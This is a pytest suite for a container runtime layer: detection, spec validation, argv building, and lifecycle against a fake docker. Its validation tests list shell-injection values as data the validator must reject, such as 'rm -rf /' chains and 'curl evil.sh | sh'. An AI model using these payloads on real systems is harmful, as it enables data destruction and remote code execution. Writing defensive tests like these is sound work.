"""Container runtime layer: detection, spec validation, argv building, lifecycle.

Nothing here ever shells out to a real docker or podman. ``containers._run`` is
the seam -- the one place a subprocess actually gets spawned -- so every test
either checks the pure functions (``parse_spec``, ``create_argv``) that never
touch it, or fakes it the way ``conftest.py`` fakes the optional device
libraries: swap the seam, assert on what was asked of it.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest

from project_os.core import containers


def _live_containers():
    """Resolve whatever module ``project_os.core.containers`` is bound to right now.

    conftest.py's ``home`` fixture drops every ``project_os.*`` entry from
    ``sys.modules`` before a test that builds the FastAPI app, so that
    ``api/store.py`` and ``plugins.py`` get a clean re-import per test. The
    ``containers`` name this file imported at collection time keeps pointing
    at the *old* module object once that happens -- patching it would silence
    a fake that the live app never sees. Fixtures and tests that both patch
    the runtime seam and drive requests through ``auth_client`` need the
    current object, fetched after the app (and thus the reset) exists.
    """
    import sys

    return sys.modules.get("project_os.core.containers", containers)


# --------------------------------------------------------------------------- fakes


class FakeCompletedProcess:
    def __init__(self, returncode: int = 0, stdout: bytes = b"", stderr: bytes = b"") -> None:
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


class FakeRuntime:
    """A tiny in-memory docker/podman: enough state to make the lifecycle
    functions behave like the real thing without a daemon anywhere nearby."""

    def __init__(self) -> None:
        self.images = set()  # type: set
        self.containers = {}  # type: Dict[str, Dict[str, Any]]
        self.calls = []  # type: List[List[str]]

    def run(self, argv: List[str], timeout: float = 0) -> FakeCompletedProcess:
        self.calls.append(list(argv))
        engine, verb = argv[0], argv[1]
        assert engine in containers.RUNTIMES

        if verb == "image" and argv[2] == "inspect":
            image = argv[3]
            return FakeCompletedProcess(0 if image in self.images else 1)

        if verb == "pull":
            self.images.add(argv[2])
            return FakeCompletedProcess(0)

        if verb == "create":
            name = argv[argv.index("--name") + 1]
            image = argv[-1]
            self.containers[name] = {"image": image, "running": False, "argv": argv}
            return FakeCompletedProcess(0)

        if verb == "start":
            name = argv[-1]
            if name not in self.containers:
                return FakeCompletedProcess(1, stderr=b"no such container")
            self.containers[name]["running"] = True
            return FakeCompletedProcess(0)

        if verb == "stop":
            name = argv[-1]
            if name not in self.containers:
                return FakeCompletedProcess(1, stderr=b"no such container")
            self.containers[name]["running"] = False
            return FakeCompletedProcess(0)

        if verb == "rm":
            name = argv[-1]
            existed = self.containers.pop(name, None) is not None
            return FakeCompletedProcess(0 if existed else 1, stderr=b"" if existed else b"no such container")

        if verb == "inspect":
            name = argv[-1]
            record = self.containers.get(name)
            if record is None:
                return FakeCompletedProcess(1, stderr=b"no such object")
            payload = [
                {
                    "State": {"Running": record["running"], "Status": "running" if record["running"] else "exited"},
                    "Config": {"Image": record["image"]},
                }
            ]
            return FakeCompletedProcess(0, stdout=json.dumps(payload).encode("utf-8"))

        if verb == "logs":
            name = argv[-1]
            if name not in self.containers:
                return FakeCompletedProcess(1, stderr=b"no such container")
            return FakeCompletedProcess(0, stdout=b"hello from the container\n")

        raise AssertionError("unexpected command: %r" % (argv,))


@pytest.fixture()
def fake_runtime(monkeypatch: pytest.MonkeyPatch) -> FakeRuntime:
    fake = FakeRuntime()
    # Both objects, because they are not always the same one. The tests in this
    # file call the module imported at collection time, while the app calls
    # whatever is in sys.modules after conftest's purge. Patching only one of
    # them leaves the other talking to a real docker socket -- which is how a
    # green suite started failing the moment an unrelated test happened to
    # re-import project_os.core.containers first.
    monkeypatch.setattr(containers, "_run", fake.run)
    live = _live_containers()
    if live is not containers:
        monkeypatch.setattr(live, "_run", fake.run)
    return fake


VALID_SPEC_RAW = {
    "image": "example.org/demo/app:1.2.3",
    "ports": [{"host": 8080, "container": 80}],
    "volumes": [{"name": "data", "path": "/data", "mode": "rw"}],
    "env": {"TZ": "America/Sao_Paulo"},
}


# --------------------------------------------------------------------------- detection


def test_no_runtime_is_reported_honestly(monkeypatch: pytest.MonkeyPatch) -> None:
    """A machine with neither docker nor podman must say so, never crash."""
    monkeypatch.setattr(containers.shutil, "which", lambda name: None)
    assert containers.detect_runtime() is None
    status = containers.runtime_status()
    assert status["available"] is False
    assert status["engine"] is None
    assert "docker" in status["reason"] and "podman" in status["reason"]
    with pytest.raises(containers.ContainerError):
        containers.require_runtime()


def test_docker_found_before_podman(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(containers.shutil, "which", lambda name: ("/usr/bin/" + name) if name in ("docker", "podman") else None)
    assert containers.detect_runtime() == "docker"
    assert containers.runtime_status() == {"available": True, "engine": "docker", "reason": None}


def test_podman_found_when_docker_is_absent(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(containers.shutil, "which", lambda name: "/usr/bin/podman" if name == "podman" else None)
    assert containers.detect_runtime() == "podman"


# --------------------------------------------------------------------------- spec validation


def test_a_valid_spec_normalises_cleanly() -> None:
    spec = containers.parse_spec("audiobookshelf", VALID_SPEC_RAW)
    assert spec == {
        "image": "example.org/demo/app:1.2.3",
        "ports": [{"host": 8080, "container": 80}],
        "volumes": [{"name": "data", "path": "/data", "mode": "rw"}],
        "env": {"TZ": "America/Sao_Paulo"},
    }


def test_spec_must_be_a_mapping() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", ["not", "a", "mapping"])


def test_missing_image_is_refused() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": ""})


def test_image_with_shell_metacharacters_is_refused() -> None:
    for hostile in ("nginx; rm -rf /", "nginx && curl evil.sh | sh", "nginx `whoami`", "../escape:latest"):
        with pytest.raises(containers.ContainerError):
            containers.parse_spec("app", {"image": hostile})


def test_port_out_of_range_is_refused() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "ports": [{"host": 70000, "container": 80}]})


def test_non_numeric_port_is_refused() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "ports": [{"host": "8080; rm -rf /", "container": 80}]})


def test_volume_name_must_look_like_an_identifier() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "volumes": [{"name": "../../etc", "path": "/data"}]})


def test_duplicate_volume_names_are_refused() -> None:
    raw = {
        "image": "x",
        "volumes": [{"name": "data", "path": "/a"}, {"name": "data", "path": "/b"}],
    }
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", raw)


def test_volume_path_must_be_absolute_and_plain() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "volumes": [{"name": "data", "path": "relative/path"}]})


def test_bad_volume_mode_is_refused() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "volumes": [{"name": "data", "path": "/data", "mode": "delete-everything"}]})


def test_env_key_must_be_a_shell_safe_identifier() -> None:
    with pytest.raises(containers.ContainerError):
        containers.parse_spec("app", {"image": "x", "env": {"NOT VALID; rm -rf /": "1"}})


def test_env_values_are_coerced_to_strings() -> None:
    spec = containers.parse_spec("app", {"image": "x", "env": {"PORT": 8080, "DEBUG": True}})
    assert spec["env"] == {"PORT": "8080", "DEBUG": "True"}


# --------------------------------------------------------------------------- argv building


def test_create_argv_is_an_argument_list_not_a_shell_string(tmp_path: Path) -> None:
    spec = containers.parse_spec("audiobookshelf", VALID_SPEC_RAW)
    argv = containers.create_argv("docker", "audiobookshelf", spec, tmp_path)
    assert argv[:2] == ["docker", "create"]
    assert "--name" in argv and "project_os-audiobookshelf" in argv
    assert "-p" in argv and "8080:80" in argv
    assert "-e" in argv and "TZ=America/Sao_Paulo" in argv
    volume_flag_index = argv.index("-v")
    assert argv[volume_flag_index + 1] == "%s:/data:rw" % (tmp_path / "data")
    assert argv[-1] == spec["image"]
    # every element is a separate argv entry -- nothing here is a single
    # string a shell would have to split, which is the actual injection guard.
    assert all(isinstance(part, str) for part in argv)


def test_container_name_is_namespaced() -> None:
    assert containers.container_name("n8n") == "project_os-n8n"


# --------------------------------------------------------------------------- lifecycle against the fake runtime


def test_ensure_running_pulls_creates_and_starts_once(fake_runtime: FakeRuntime, tmp_path: Path) -> None:
    spec = containers.parse_spec("n8n", VALID_SPEC_RAW)
    containers.ensure_running("docker", "n8n", spec, tmp_path)
    name = containers.container_name("n8n")
    assert spec["image"] in fake_runtime.images
    assert fake_runtime.containers[name]["running"] is True
    # the volume's host directory was actually created
    assert (tmp_path / "data").is_dir()

    # calling it again must not pull or create a second time
    calls_before = len(fake_runtime.calls)
    containers.ensure_running("docker", "n8n", spec, tmp_path)
    verbs_since = [call[1] for call in fake_runtime.calls[calls_before:]]
    assert "pull" not in verbs_since
    assert "create" not in verbs_since
    assert "start" in verbs_since


def test_stop_is_a_noop_on_a_container_that_was_never_created(fake_runtime: FakeRuntime) -> None:
    containers.stop("docker", "never-installed")
    # stop() has to inspect first to know there is nothing to stop -- that
    # one lookup is the only command that should ever run.
    assert fake_runtime.calls == [["docker", "inspect", "project_os-never-installed"]]


def test_remove_deletes_the_container(fake_runtime: FakeRuntime, tmp_path: Path) -> None:
    spec = containers.parse_spec("n8n", VALID_SPEC_RAW)
    containers.ensure_running("docker", "n8n", spec, tmp_path)
    name = containers.container_name("n8n")
    assert name in fake_runtime.containers
    containers.remove("docker", "n8n")
    assert name not in fake_runtime.containers


def test_status_detail_reports_missing_before_install(fake_runtime: FakeRuntime) -> None:
    assert containers.status_detail("docker", "never-installed") == {"container_status": "missing"}


def test_status_detail_reports_running_after_install(fake_runtime: FakeRuntime, tmp_path: Path) -> None:
    spec = containers.parse_spec("n8n", VALID_SPEC_RAW)
    containers.ensure_running("docker", "n8n", spec, tmp_path)
    detail = containers.status_detail("docker", "n8n")
    assert detail["container_status"] == "running"
    assert detail["image"] == spec["image"]


def test_logs_returns_empty_string_for_a_missing_container(fake_runtime: FakeRuntime) -> None:
    assert containers.logs("docker", "never-installed") == ""


def test_logs_returns_output_for_a_running_container(fake_runtime: FakeRuntime, tmp_path: Path) -> None:
    spec = containers.parse_spec("n8n", VALID_SPEC_RAW)
    containers.ensure_running("docker", "n8n", spec, tmp_path)
    assert "hello from the container" in containers.logs("docker", "n8n")


def test_missing_binary_is_reported_not_raised_as_something_else(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_run(argv, timeout=0):
        raise FileNotFoundError()

    import subprocess as real_subprocess

    monkeypatch.setattr(containers, "subprocess", real_subprocess)
    monkeypatch.setattr(real_subprocess, "run", lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError()))
    with pytest.raises(containers.ContainerError):
        containers._run(["docker", "ps"])


# --------------------------------------------------------------------------- wired into the store


@pytest.fixture()
def container_engine(monkeypatch: pytest.MonkeyPatch, auth_client, fake_runtime: FakeRuntime) -> FakeRuntime:
    """Make the store believe docker is installed and drive it through the fake.

    ``auth_client`` is a real dependency here, not an unused convenience --
    building it is what makes ``project_os.main`` re-import the whole
    ``project_os.*`` tree (see ``_live_containers`` above). Only after that has
    happened does ``sys.modules`` hold the same ``containers`` object that
    ``api/store.py`` and ``plugins.py`` are actually calling into, so both
    patches are (re)applied to that object rather than trusted to whatever
    ``fake_runtime`` patched earlier.
    """
    live = _live_containers()
    monkeypatch.setattr(live, "_run", fake_runtime.run)
    monkeypatch.setattr(live, "detect_runtime", lambda: "docker")
    return fake_runtime


def test_store_install_runs_the_real_installer_for_a_container_app(auth_client, container_engine: FakeRuntime) -> None:
    response = auth_client.post("/api/store/n8n/install", json={})
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["installed"] is True
    assert body["app"]["state"] == "running"
    name = containers.container_name("n8n")
    assert container_engine.containers[name]["running"] is True


def test_store_uninstall_removes_the_container_the_install_created(auth_client, container_engine: FakeRuntime) -> None:
    install = auth_client.post("/api/store/n8n/install", json={})
    assert install.status_code == 200, install.text
    name = containers.container_name("n8n")
    assert name in container_engine.containers

    uninstall = auth_client.delete("/api/store/n8n")
    assert uninstall.status_code == 200, uninstall.text
    assert name not in container_engine.containers

    # and it can be listed as not-installed again
    browse = auth_client.get("/api/store")
    assert browse.status_code == 200
    n8n = next(item for item in browse.json()["items"] if item["id"] == "n8n")
    assert n8n["installed"] is False


def test_store_install_still_refuses_an_oversize_container_app(
    auth_client, container_engine: FakeRuntime, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The container installer does not bypass the RAM speed bump."""
    from project_os.core import catalog

    class TinyBoard(object):
        model = "test"
        ram_mb = 400
        ram_total_mb = 400
        tier = "minimal"

    monkeypatch.setattr(catalog.hardware, "detect", lambda: TinyBoard())
    response = auth_client.post("/api/store/n8n/install", json={})
    assert response.status_code == 409
    assert response.json()["error"] == "does_not_fit"
    assert containers.container_name("n8n") not in container_engine.containers

    # accept_oversize still lets it through, and it still actually installs
    response = auth_client.post("/api/store/n8n/install", json={"accept_oversize": True})
    assert response.status_code == 200, response.text
    assert containers.container_name("n8n") in container_engine.containers


def test_store_install_reports_no_runtime_instead_of_crashing(auth_client, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(_live_containers(), "detect_runtime", lambda: None)
    response = auth_client.post("/api/store/n8n/install", json={})
    assert response.status_code == 503
    assert response.json()["error"] == "no_container_runtime"


def test_store_browse_shows_runtime_status_before_install(auth_client, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(containers.shutil, "which", lambda name: None)
    response = auth_client.get("/api/store")
    assert response.status_code == 200
    n8n = next(item for item in response.json()["items"] if item["id"] == "n8n")
    assert n8n["container_runtime"]["available"] is False


def test_container_app_without_a_spec_still_reports_installer_pending(auth_client, container_engine: FakeRuntime) -> None:
    # frigate is kind: container in the catalog but has no container: block yet.
    response = auth_client.post("/api/store/frigate/install", json={"accept_oversize": True})
    assert response.status_code == 501
    assert response.json()["error"] == "installer_pending"
